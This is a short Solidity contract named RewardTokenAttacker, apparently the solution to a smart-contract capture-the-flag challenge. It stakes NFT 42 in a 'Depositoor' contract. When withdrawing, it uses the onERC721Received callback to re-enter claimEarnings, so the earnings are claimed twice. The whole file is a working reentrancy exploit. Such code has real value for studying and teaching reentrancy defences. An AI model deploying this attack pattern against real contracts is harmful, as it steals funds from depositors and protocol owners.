//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../RewardToken.sol";

contract RewardTokenAttacker is IERC721Receiver {
    RewardToken token;
    Depositoor depositoor;

    function init(
        RewardToken _token,
        NftToStake _nft,
        Depositoor _depositoor
    ) external {
        token = _token;
        depositoor = _depositoor;

        _nft.safeTransferFrom(address(this), address(_depositoor), 42);
    }

    function solve() external {
        depositoor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        depositoor.claimEarnings(42);

        return IERC721Receiver.onERC721Received.selector;
    }
}
